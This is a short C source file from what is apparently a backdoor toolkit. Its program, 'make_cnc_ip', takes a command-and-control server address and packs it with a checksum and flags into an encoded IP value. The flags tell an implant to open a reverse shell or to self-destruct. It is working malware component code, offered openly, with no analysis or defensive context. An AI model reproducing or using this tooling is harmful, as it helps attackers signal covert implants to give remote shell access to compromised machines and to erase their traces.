#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "backdoor.h"

void main(int argc, char *argv[]) {
	struct in_addr addr;
	unsigned int cnc_val;
	int chksum, i;

	int rshell_flag=0;
	int self_destruct_flag=0;

	if (argc < 2) {
		printf("make_cnc_ip [ip_address] [BD_CNC_RSHELL_FLAG] [BD_CNC_SELF_DESTRUCT]\n");
		exit(0);
	}

	for (i=2;i<argc;i++) {
		if (!strcmp(argv[i], "BD_CNC_RSHELL_FLAG")) {
			rshell_flag=1;
		} else if (!strcmp(argv[i], "BD_CNC_SELF_DESTRUCT")) {
			self_destruct_flag=1;
		} else {
			printf("Unknown option: %s\n", argv[i]);
			exit(1);
		}
	}	

        if (!inet_aton(argv[1], &addr)) {
		printf("Invalid address %s\n", argv[1]);
		exit(1);
	}

	cnc_val=htonl((unsigned int)addr.s_addr) >> 8;

	if (rshell_flag) {
		cnc_val |= BD_CNC_RSHELL_FLAG;	
	} else {
		cnc_val &= (BD_CNC_RSHELL_FLAG ^ 0xFFFFFFFF);
	}

	if (self_destruct_flag) {
		cnc_val |= BD_CNC_SELF_DESTRUCT;
	} else {
		cnc_val &= (BD_CNC_SELF_DESTRUCT ^ 0xFFFFFFFF);
	}

	chksum=(cnc_val >> 16 & 0xff) + (cnc_val >> 8 & 0xff) + (cnc_val & 0xff);
        chksum &= 0xff;

	addr.s_addr=(htonl((cnc_val << 8) | chksum));

	printf("%s\n", inet_ntoa(addr));
}
